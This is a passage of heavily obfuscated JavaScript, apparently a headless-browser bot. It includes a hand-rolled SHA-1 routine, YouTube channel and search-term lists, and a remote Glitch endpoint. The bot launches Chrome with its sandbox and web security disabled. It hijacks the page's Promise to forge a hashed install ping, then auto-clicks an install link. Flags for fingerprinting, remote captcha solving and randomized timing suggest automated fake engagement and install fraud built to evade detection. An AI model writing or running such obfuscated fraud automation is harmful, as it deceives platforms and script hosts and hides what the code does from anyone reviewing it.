                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this[V(0xb)], N >= -0x3 * -0x32b + 0x1525 * -0x1 + 0xbe4 ? (this['block'] = P[0x25 * -0x8b + 0x25 * -0xcd + 0x31c8], this['start'] = N - (0x1 * -0xbd3 + -0x247a + 0x308d), this['hash'](), this['hashed'] = 0xd02 + -0xaa7 + -0x7 * 0x56) : this['start'] = N;
                }
                return this['bytes'] > 0x3 * 0x88ffa089 + -0x201a9 * -0x80bb + -0x19d4a980f && (this['hBytes'] += this['bytes'] / (0x4 * 0x62ef9c54 + -0x19e8 * 0x50841 + -0x9609d68) << -0x1 * -0x248e + -0x1120 + -0x6 * 0x33d, this['bytes'] = this['bytes'] % (-0x8 * 0x61b80d3 + -0x1c6197f40 + 0x2f6f585d8)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x13c8 + 0x1873 + 0x1 * -0x2c3a;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0x915 + 0x2102 + 0x95 * -0x29] = this['block'], J[K >> -0x1e4f + -0x18e * -0xa + 0xec5] |= x[-0xe0d + 0x9c6 + 0x44a & K], this['block'] = J[-0x99 * -0x21 + 0x707 + -0x1ab0], K >= 0x1287 + 0x172c * 0x1 + -0x5ed * 0x7 && (this['hashed'] || this['hash'](), J[-0x1774 + -0x1a57 * 0x1 + 0x31cb] = this['block'], J[0x1a3b + -0x106c + -0x9bf] = J[0x2 * -0xb8d + -0x26dd + 0x3df8] = J[0x1 * -0x78b + 0x26 * -0x1d + 0xbdb] = J[-0x2609 + -0x1e94 + 0x7a * 0x90] = J[-0x1122 + 0x2333 * 0x1 + -0x1 * 0x120d] = J[-0xf7e + 0x1d6b * 0x1 + 0xde8 * -0x1] = J[0x9c7 * -0x2 + -0xbe + 0x33 * 0x66] = J[-0x172c + -0x512 + 0x1c45] = J[-0x1c03 + 0x1 * -0x527 + -0x1 * -0x2132] = J[-0x1ac1 + 0x17ba + 0x70 * 0x7] = J[0x2298 + 0x3 * -0x259 + -0x1b83] = J[-0x1afe + 0x22da + -0x57 * 0x17] = J[-0x1fa9 + 0x17c7 + -0x2 * -0x3f7] = J[-0x49d + 0x7cf + -0x325] = J[0x2299 + 0x22e5 + 0x16 * -0x328] = J[0x521 + -0x23a0 + -0x1 * -0x1e8e] = -0x129b + -0xb * -0x1d7 + -0x1a2), J[0x3 * -0x17f + -0x2b3 * -0x7 + -0xe5a] = this['hBytes'] << 0x1 * 0x1b47 + 0x1aca + 0x275 * -0x16 | this['bytes'] >>> -0x1 * 0x1864 + -0x206b + 0x38ec, J[-0x7 * -0x2fa + -0x35 * -0x43 + -0x2 * 0x1153] = this['bytes'] << 0xee4 + 0xe45 + -0x1d26, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x1630 + -0x16 * -0x2 + 0x3ae * 0x6; J < 0x5f2 * -0x2 + 0x93b + 0x2f9; ++J)
                K = Q[J - (0xdce + 0x1 * 0x2549 + 0x3314 * -0x1)] ^ Q[J - (0x7 * -0x49f + 0x49c + 0x1 * 0x1bc5)] ^ Q[J - (0x16ea + -0x13e3 + -0x2f9 * 0x1)] ^ Q[J - (-0x170e + 0x2173 + -0xa55)], Q[J] = K << 0x7 * -0x41a + -0xd * 0xd + 0x1d60 | K >>> -0x4f * -0x4f + -0x12dd + -0x565;
              for (J = -0x1f90 + 0x7cd + 0x17c3; J < 0x53f * 0x6 + -0x3 * -0x760 + -0x3586; J += -0x751 + 0x1 * -0x1ace + 0x2224)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1547 * 0x1 + 0x1f20 + -0x1 * 0x9d4 | L >>> 0x3 * 0xc51 + 0x22 + -0x127d * 0x2) + (M & N | ~M & O) + P + (0x911d2e6f + 0x70b0769 + -0x148c9415 * 0x3) + Q[J] << -0x21f9 + -0x2020 + 0x4219) << -0x22b0 + -0x1a * 0x89 + -0x1035 * -0x3 | P >>> -0xb5 * -0x25 + 0x1 * 0xff3 + -0x1 * 0x2a01) + (L & (M = M << -0x1 * -0x1b29 + 0x5 * 0x7a5 + -0x4144 | M >>> -0x1b73 + -0x3 * -0x4e1 + 0x3 * 0x446) | ~L & N) + O + (0x83aa5f49 + 0x12c937d * -0x47 + 0x95 * 0x48844f) + Q[J + (0x2274 + 0x14d2 + -0x3745)] << -0x2505 + -0x2 * 0xf10 + 0x4325) << -0x1 * 0x2456 + -0x11 * 0xc1 + 0x832 * 0x6 | O >>> 0x180f + 0x4b9 + -0x1cad) + (P & (L = L << 0x250d + -0x1 * 0x505 + -0x1fea | L >>> 0x209b + 0x13d * -0x2 + -0x1e1f * 0x1) | ~P & M) + N + (0x780db01 + 0x2c976dc2 + -0x2 * -0x1335186b) + Q[J + (-0x40f * -0x8 + -0x2151 * 0x1 + 0x3 * 0x49)] << -0xcc * 0x13 + 0xa12 * -0x3 + 0x2d5a) << -0xc4 * 0x28 + -0x1f1b * -0x1 + -0x76 | N >>> 0x215c * 0x1 + 0x1 * -0x1b15 + 0x1 * -0x62c) + (O & (P = P << 0x1c6 + 0x1b * -0x2f + 0x34d | P >>> -0x22e3 + 0x35a + 0x1f8b) | ~O & L) + M + (0xe3c40a8 + -0x9f50855b + 0xeb96be4c) + Q[J + (-0x100 + -0x1 * -0x160f + 0x1c1 * -0xc)] << -0x128b + 0x1fa0 + -0xd15) << -0x487 + -0x41b + 0x8a7 | M >>> 0x70 * -0x43 + 0x69b + 0xa * 0x248) + (N & (O = O << -0xcf3 + -0x287 * -0x3 + 0xd * 0x6c | O >>> -0x1 * -0x237b + 0x18cf + -0x3c48) | ~N & P) + L + (0x93c7e13f * 0x1 + -0x1 * -0x7840a7bb + -0x245 * 0x4e386d) + Q[J + (0x20a5 + 0x9d * -0x3d + -0x33 * -0x18)] << 0x78c + 0x6b2 + -0xe3e * 0x1, N = N << -0x1 * -0x1240 + -0x25d2 + 0x1a4 * 0xc | N >>> 0x5 * -0x20c + 0x72 * 0x3 + 0x8e8;
              for (; J < 0x1 * -0x21f7 + 0x1bb * 0x5 + 0x1978; J += 0x1 * -0x1a4f + 0x1b2 + -0x6 * -0x41b)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1650 + -0x1bfe + -0x3253 * -0x1 | L >>> -0x1753 * 0x1 + -0x1c74 + 0x33e2) + (M ^ N ^ O) + P + (0xd129e75f + -0xcdf52dc1 + -0x5 * -0x15877067) + Q[J] << -0x18df + -0x1 * 0x1601 + 0x2ee0) << -0x1841 + 0x215e + -0x6 * 0x184 | P >>> 0x1791 + -0xd7d + 0x45 * -0x25) + (L ^ (M = M << -0x15b0 + 0x16a * 0x18 + -0x611 * 0x2 | M >>> -0x3e3 + -0x267 * -0x5 + -0x81e) ^ N) + O + (-0x790d4726 + 0x56746cb6 + 0x9172c611) + Q[J + (-0x202d + 0x1 * -0x15d8 + -0x901 * -0x6)] << 0xb4c * -0x2 + 0x7 * 0x116 + 0xefe) << 0x2692 + 0x10da + 0xd * -0x443 | O >>> 0x7c1 * -0x1 + -0x6 * -0x3df + -0x1 * 0xf5e) + (P ^ (L = L << -0x2 * 0xd5a + 0x2437 + -0x965 | L >>> 0x61 * -0xd + -0x5ef * 0x4 + 0x1 * 0x1cab) ^ M) + N + (0x4ee0b1d6 + -0x28327ad7 + -0x13925c6 * -0x3b) + Q[J + (-0x9 * 0x413 + -0x1a76 + -0x7 * -0x905)] << -0x32c + -0xb7f + 0x1 * 0xeab) << -0x1 * -0x4df + 0x1efc + -0x5f9 * 0x6 | N >>> 0xd20 + -0x1 * -0x1945 + -0x179 * 0x1a) + (O ^ (P = P << 0x790 * 0x1 + -0x11 * -0x11 + -0x893 * 0x1 | P >>> -0x20 * 0x95 + -0x1 * -0x1e1b + 0xb79 * -0x1) ^ L) + M + (-0x4b7d73bc + -0x17b1257 + 0xbbd271b4) + Q[J + (0x36 * 0x27 + 0x122e + -0x1a65)] << 0x193 * 0x11 + -0xe86 + -0x1 * 0xc3d) << 0x1d5 * 0x12 + -0x961 + -0x6 * 0x3ee | M >>> 0x2 * 0x292 + -0x23c4 + 0x1ebb) + (N ^ (O = O << -0x2378 + 0xe06 + -0xa * -0x228 | O >>> -0xeb * -0x3 + -0x1f15 + 0x1c56) ^ P) + L + (0x6989f442 + -0x3a17ac66 + 0x3f67a3c5) + Q[J + (0x126f + -0x2 * -0x12cd + 0x3805 * -0x1)] << -0x10 + -0x3b4 + 0x3c4, N = N << -0x1051 * 0x1 + 0x6 * -0x385 + -0x258d * -0x1 | N >>> 0x13e + -0x891 + 0x755;
              for (; J < 0x37 * -0x4 + -0x1365 + 0x147d; J += 0x3f1 * -0x7 + -0x26c7 + -0x21 * -0x203)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1140 + -0x19e * 0xb + 0x1 * 0x8f | L >>> -0x43 * 0xe + -0x269f + 0x2a64) + (M & N | M & O | N & O) + P - (-0x13362cce * 0x7 + -0x1 * -0x6b319197 + -0x99b * -0xe97fd) + Q[J] << -0x36 * -0x66 + 0x183c * -0x1 + -0x8 * -0x57) << -0x26d + 0x19ee + -0x3 * 0x7d4 | P >>> 0x6 * 0x2c9 + -0x2a9 * 0x9 + -0x139 * -0x6) + (L & (M = M << 0x1edc + -0x562 + -0x195c | M >>> 0x98e + 0x1265 + -0x1bf1) | L & N | M & N) + O - (-0xe2197f1 * -0x8 + -0x1 * 0xbc4b48b2 + 0xbc22cc4e) + Q[J + (-0x55 * -0x50 + -0x1 * 0x12af + -0x120 * 0x7)] << -0x25 * 0x81 + 0x2 * 0xd4 + 0x10fd) << -0x95d + -0x9aa + -0x2e * -0x6a | O >>> 0x1c2f + -0x4c8 + 0x2a * -0x8e) + (P & (L = L << 0xc1e + 0x4e1 * 0x5 + 0x1 * -0x2465 | L >>> 0x147c + 0x401 * 0x2 + -0x71f * 0x4) | P & M | L & M) + N - (0x7b3bc4af * -0x1 + -0x5c05219d + 0x148252970) + Q[J + (0x16d5 + -0x1 * -0x1cb7 + -0x3 * 0x112e)] << -0x1ab7 + -0x35 * 0x21 + 0x2 * 0x10c6) << 0xadb + -0x2459 + -0x137 * -0x15 | N >>> 0x7 * -0x455 + -0xd * 0x5d + 0x2327) + (O & (P = P << -0x1475 + -0x5 * -0x138 + 0xe7b | P >>> -0x5 * -0x545 + -0x135 * 0x18 + 0x2a1) | O & L | P & L) + M - (-0x5642dafa + -0x4ac6aa58 * -0x1 + 0x696e95 * 0x12e) + Q[J + (0x6b5 + 0x221d + -0x28cf)] << -0x7c * 0x3 + 0x292 * -0x2 + 0x8 * 0xd3) << -0x7 * 0x37f + -0x11 * -0x25 + 0x1609 | M >>> -0x1be * -0x7 + 0x61f + -0x1236 * 0x1) + (N & (O = O << 0x7 * -0x3d + 0x1f20 + -0x1d57 * 0x1 | O >>> -0x4 * -0x3fc + 0x85f * 0x3 + -0x13 * 0x229) | N & P | O & P) + L - (-0x466e4e2 + 0x9 * -0x12b06def + 0x11d7f056d) + Q[J + (0x205d + 0x23 * -0xb5 + -0x8b * 0xe)] << 0x1ca5 * 0x1 + -0xefa + -0xdab, N = N << 0xf1a + -0x13 * 0x1a5 + -0xb5 * -0x17 | N >>> 0x1e58 * -0x1 + 0x22bf + 0x2d * -0x19;
              for (; J < 0x65 * 0x3d + 0x1f7e + -0x373f; J += -0x10f6 * -0x1 + 0x1de * 0xe + 0x10d * -0x29)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x197b + -0x50e + -0x1468 * 0x1 | L >>> 0x248d + -0x1 * 0x1ca + -0x22a8) + (M ^ N ^ O) + P - (0x12730 * 0x4359 + 0x62958d2c + -0x7aa07eb2) + Q[J] << -0x6 * 0x55b + -0x1488 * 0x1 + 0x34aa) << -0x12a8 + 0x1 * 0xb6c + 0x741 | P >>> 0x8c3 * 0x4 + 0x1ff6 + 0x615 * -0xb) + (L ^ (M = M << 0x2583 + 0x1 * 0x23ab + -0x4910 | M >>> 0x2587 * 0x1 + 0x967 * 0x2 + -0x3853) ^ N) + O - (0x42e431bf * -0x1 + 0x20ea5 * 0x2af8 + 0x201c2e11) + Q[J + (0x5 * -0x1cf + 0x56 * -0x69 + -0x2c52 * -0x1)] << 0x31 * -0xc5 + 0x24ce + 0xe7) << -0x153 + 0x1 * 0x2288 + 0xb1 * -0x30 | O >>> 0x453 * -0x7 + 0x25bc + -0x1d7 * 0x4) + (P ^ (L = L << -0x21ed + 0x1edf + 0x32c * 0x1 | L >>> -0x10f1 + 0x983 + -0x38 * -0x22) ^ M) + N - (0x463dc65b + 0x6ad8a019 + 0x17dee * -0x52c3) + Q[J + (-0x119f * 0x1 + -0x32f * 0x4 + 0x1e5d)] << -0x24b9 * -0x1 + 0x15d * -0x3 + -0x20a2) << -0xfb5 * -0x1 + 0x6ef + -0x169f | N >>> -0x1852 + 0x29b + 0x15d2) + (O ^ (P = P << -0x318 * 0x7 + -0x1f24 + 0x34ea | P >>> -0x1f16 + 0x2 * -0xb41 + 0x1 * 0x359a) ^ L) + M - (-0x2bb06c9 * -0x12 + -0x223d4528 + 0x14 * 0x1ef66dc) + Q[J + (-0x1819 * -0x1 + 0x1cc9 * 0x1 + -0x34df)] << -0xb * -0x2b5 + -0x2697 + 0x468 * 0x2) << 0xa47 + 0x1b35 + 0x1 * -0x2577 | M >>> -0x16a4 + 0x18d5 + -0x216) + (N ^ (O = O << 0x1c5c + 0x456 + -0x2094 | O >>> -0x1d0 * 0x1 + 0x21e7 + 0xbf * -0x2b) ^ P) + L - (0x1f0ec9b * 0x9 + 0x14f7068d + 0xd * 0x12aea52) + Q[J + (0x1 * -0x13eb + -0x43a + 0x1829)] << 0x347 * -0x9 + 0x1 * 0x2437 + 0x2b * -0x28, N = N << -0x1416 + -0x1 * -0x485 + 0xfaf | N >>> 0x79b + -0x1 * 0x823 + 0x45 * 0x2;
              this['h0'] = this['h0'] + L << 0x2a2 * 0x6 + 0x1006 * -0x1 + 0x1d * 0x2, this['h1'] = this['h1'] + M << -0x4f * 0x23 + -0x1cd4 + 0x27a1, this['h2'] = this['h2'] + N << 0x26 * 0x73 + 0x2dd + -0x9 * 0x237, this['h3'] = this['h3'] + O << 0x1c4e + -0x58f * 0x3 + 0xba1 * -0x1, this['h4'] = this['h4'] + P << -0x1 * -0x2499 + -0x270a + 0x271;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x1ab4 + -0x1 * -0x11c9 + -0x2c61 & -0x8 * -0x1f3 + -0x1697 + 0x70e] + w[J >> -0x13cc + 0x127 * -0xd + 0x22df & -0x3 * 0x1e5 + -0x34d + -0x90b * -0x1] + w[J >> 0x1 * 0x2185 + 0x126c + -0x33dd & 0x2339 + 0xb02 + -0x6 * 0x7b2] + w[J >> -0x1b9 + -0x1b21 + -0x2 * -0xe75 & -0x919 * -0x2 + 0x2 * 0x12f1 + -0x1 * 0x3805] + w[J >> -0x2697 + -0x1e72 + -0xf * -0x49b & 0x622 * -0x2 + -0x1 * -0x6a1 + 0x12 * 0x51] + w[J >> -0x1 * 0x54b + 0x19d8 + 0x33 * -0x67 & 0xd18 * 0x1 + 0x1bd2 + -0x28db] + w[J >> 0xc5 * -0x2b + 0x542 * -0x1 + 0x265d & 0x1ee4 + 0x15a6 + -0x347b] + w[-0x1a87 + 0x1c1e + 0x2 * -0xc4 & J] + w[K >> 0x1 * 0x1a0f + -0xab3 + 0x3d0 * -0x4 & 0x29 * -0x4a + -0x1 * 0x373 + 0xf5c] + w[K >> -0x1 * 0xcf4 + -0x88f * 0x3 + 0x26b9 & 0x2 * -0x153 + 0x1 * 0x4fd + -0x248] + w[K >> -0x310 + 0x1 * 0xe9b + -0xb77 * 0x1 & 0xcb * -0x8 + 0xcd5 + -0x2 * 0x337] + w[K >> 0x2595 + 0x1d74 + -0x5 * 0xd65 & 0x3af * 0x1 + -0x492 + -0xf2 * -0x1] + w[K >> 0xf57 + 0x8b6 + -0x1801 * 0x1 & 0x10 * -0x119 + 0x2599 + -0x13fa] + w[K >> -0x14 * 0x3c + 0x3a6 + 0x112 & 0x2433 + 0xac4 * -0x1 + 0xcb * -0x20] + w[K >> 0x2374 + -0x69 + -0x3 * 0xbad & -0x266 * -0x5 + -0x1ca + -0xa25] + w[-0x187b + -0x1 * 0xcb5 + 0x253f & K] + w[L >> 0x1302 + 0x1a5a + -0x2d40 & 0x25f8 + 0x1533 * -0x1 + -0x10b6] + w[L >> -0x1 * -0x12cb + -0x397 * -0x2 + -0x19 * 0x109 & -0x1 * -0x1b6 + 0x260b + -0x27b2] + w[L >> 0x2496 + -0x56 * 0x7 + -0x2228 & -0xe4c + 0xc68 * -0x1 + -0x20f * -0xd] + w[L >> -0x9 * 0x9a + 0x58d + -0x13 & -0xca9 + -0x1ad1 + 0x2789] + w[L >> 0x1278 + 0x1f20 + -0x318c & 0x1928 + 0x3d1 * 0x2 + 0x20bb * -0x1] + w[L >> 0x5c6 + 0x18ab + -0x1e69 & 0x2312 + -0x117 * 0xf + -0x12aa] + w[L >> 0x620 * 0x3 + 0x105 * -0x1a + -0x413 * -0x2 & -0x5 * -0x491 + 0x778 + -0x1e3e] + w[-0x225b + 0x138c + -0xb * -0x15a & L] + w[M >> -0xc8 * -0x19 + 0x1ba6 + -0x1789 * 0x2 & -0x102f * 0x1 + 0x6f6 * 0x3 + 0x3 * -0x18c] + w[M >> 0x1 * 0x45a + 0x372 + 0x22 * -0x3a & 0x1 * 0x14b1 + 0x2391 + -0x3833] + w[M >> -0xbab + 0x1b * 0xa7 + 0x2ef * -0x2 & 0x1 * -0x13cf + 0x11 * -0x17 + 0x1565] + w[M >> -0x203 * -0xd + -0x203a + -0x1 * -0x623 & 0x64c + 0x2 * 0x892 + -0x1761] + w[M >> -0x7b5 + -0x16 * 0xb2 + 0x170d & 0xf60 + 0xbfe + 0x1b4f * -0x1] + w[M >> 0x1ece + -0xa66 + -0x1460 & 0xaef * 0x3 + 0x1dd0 + 0x3ae * -0x11] + w[M >> 0x1 * -0x1260 + -0x7 * -0x31d + 0x43 * -0xd & 0x3 * 0x1eb + -0x37 * -0x5 + -0x6c5] + w[0x7 * -0x37a + -0x1602 + -0x2e67 * -0x1 & M] + w[N >> 0x6b3 + 0xcff + 0x2e * -0x6d & 0xf * 0x1c1 + 0x1 * 0xa75 + -0x24b5] + w[N >> 0x3e0 * 0x1 + 0xa4c + -0xe14 & -0x1c90 + 0x2165 * 0x1 + -0x263 * 0x2] + w[N >> 0x1 * -0x1b41 + -0x59 * 0x3d + -0x6d * -0x72 & -0x1 * 0x2014 + 0x1933 + 0x6f0] + w[N >> 0x1 * 0x1c89 + 0x3cd + 0x1b * -0x132 & 0x254a + -0x1800 + -0xd3b] + w[N >> 0x3 * -0x7e5 + 0x3a8 + -0x1413 * -0x1 & -0x1622 + -0x1 * -0x1979 + -0x348] + w[N >> -0x59b + -0x2 * -0x495 + -0x387 & 0x2497 + 0xa0b + -0x2e93] + w[N >> -0x5 * 0xd6 + 0x1 * 0xc77 + 0x49 * -0x1d & 0x55b * 0x1 + -0x3d * 0xf + -0x1b9 * 0x1] + w[0x212 * 0x8 + -0xfb1 + -0xd0 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0xd1e + -0x2577 + -0x1 * -0x32ad & 0x25c3 + 0x1b92 + -0x4056,
                J >> -0x3b * -0x2f + -0x14b7 + 0x9f2 & -0x1 * -0x2f9 + 0x3a6 + -0x18 * 0x3c,
                J >> -0x536 + -0x2 * -0xb5b + -0x1178 & -0x46a + 0x2 * 0x6fd + -0x81 * 0x11,
                -0x972 + 0x23dd + -0x196c & J,
                K >> 0x36 * -0xad + -0x158d + 0x3a23 & -0x1486 + -0x1e49 * -0x1 + -0x8c4,
                K >> 0x2296 * 0x1 + 0x241f + -0x46a5 & 0x53f * 0x2 + 0xace * -0x3 + 0x16eb,
                K >> -0x4 * 0x379 + -0x1a47 + 0x2833 & -0xfb3 * 0x1 + 0x2533 * -0x1 + 0xbd * 0x49,
                -0xb2e * -0x2 + -0x160b + 0xae & K,
                L >> 0x1acf + 0x5 * 0x25c + -0x2683 & 0x6f3 + -0x3ed * 0x5 + 0xdad,
                L >> 0x1185 + -0x19 * 0xe3 + 0x43 * 0x12 & 0x29 * 0xe5 + 0x1d * 0x11 + -0x259b,
                L >> 0x229f + -0x2 * -0x8c2 + -0x341b & -0x1aaa + -0x54 * 0x35 + -0x13 * -0x25f,
                -0x2a * 0x3 + -0x25e1 * 0x1 + 0x1 * 0x275e & L,
                M >> -0x1 * 0x1625 + -0x10bd + 0x26fa & -0x198 + -0x7c7 * 0x2 + 0x3a1 * 0x5,
                M >> -0x1297 * -0x2 + -0x1758 + -0xdc6 * 0x1 & 0x1d9c + -0x5e0 + -0x1 * 0x16bd,
                M >> -0xfd0 + 0xb * -0x11 + 0x1093 & 0x1b7 * -0x2 + -0x2 * -0x7ad + -0xaed * 0x1,
                0x21cb * 0x1 + -0x7 * 0x241 + 0x1 * -0x1105 & M,
                N >> 0xf49 + -0x553 + -0x34a * 0x3 & 0x1b67 + -0x3a * 0x49 + -0x2 * 0x4ef,
                N >> 0x46d + 0x2b3 + -0x71 * 0x10 & 0x753 * -0x5 + -0x37 * 0x6f + 0x3d77,
                N >> -0x2251 + -0x1be6 * -0x1 + 0x673 & -0x101 * 0x2 + -0x1 * 0x1dbe + 0x20bf,
                -0x1 * -0xd79 + 0x1 * 0x209a + -0x2d14 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x325 * 0xb + 0x373 + 0x1f38), (K = new DataView(J))['setUint32'](0x1 * -0x73b + -0x1700 + 0x1e3b, this['h0']), K['setUint32'](-0x20 * -0x12b + -0x79e * 0x3 + -0xe82, this['h1']), K['setUint32'](-0xa59 + -0x1296 + 0x1cf7 * 0x1, this['h2']), K['setUint32'](0x1302 * 0x2 + 0x1275 + -0x217 * 0x1b, this['h3']), K['setUint32'](-0x12ad * 0x2 + -0x5bf + -0x7f * -0x57, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x9 * 0x2d7 + -0xfb0 + 0x293f];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0xeff * 0x1 + -0x95f * 0x4 + 0x347b;
            J[0x1 * -0x1d1b + 0x2390 + -0x675]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0xded + -0x5ee + -0x7ff] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x5 * -0x54b + -0xc66 + 0x26de), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x7f * -0x16 + -0x122b + -0x1b6 * -0x11;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          const W = c;
          I[W(0x5)]();
        }, 0x6 * -0x13 + -0x148e * 0x1 + 0x1adc), Promise['resolve'](-0x1e1e + 0x1bda + -0x1 * -0x245);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x5cf * -0x3 + 0x6 * -0x4b1 + -0x1 * -0xab9; j < 0x3ea + 0x27 * 0xc6 + -0xb * 0x319; j++)
    i();
}
const NETWORK_PATIENCE = 0x587 * 0x1 + -0xf3 * 0x21 + 0x390c + (-0x2368 * -0x1 + 0xb8 * -0x1c + -0x390) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x1 * -0xf3b + 0xe7c + 0xc2) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x1b77 + 0x517 + 0x4 * 0x598; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];

function a() {
  const bp = [
    'sr7cUq/dLSo6emkg',
    'bCocjSk4B3jQWOtcU2S',
    'Ahr0Chm6lY9NCG',
    'WRSZWP1bW7SvkIpdIrm',
    'ywzMzxmVnY1HDW',
    'y2XPy2S',
    'Android\x2010',
    'tle__playB',
    'zgLNzxn0',
    'Ct3cImoGqmk3Eu4tW7m',
    'GET',
    'C3rHCNq',
    'Ahr0Chm6lY9VCa',
    'click',
    'sb/cTWBdK8o/eSkq',
    'kcSBv8oXW57cLCo9',
    'mIW5t8osWO3cPCoV',
    'Afb4lvjPqKTyDa',
    'rg/en/scri'
  ];
  a = function() {
    return bp;
  };
  return a();
}
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 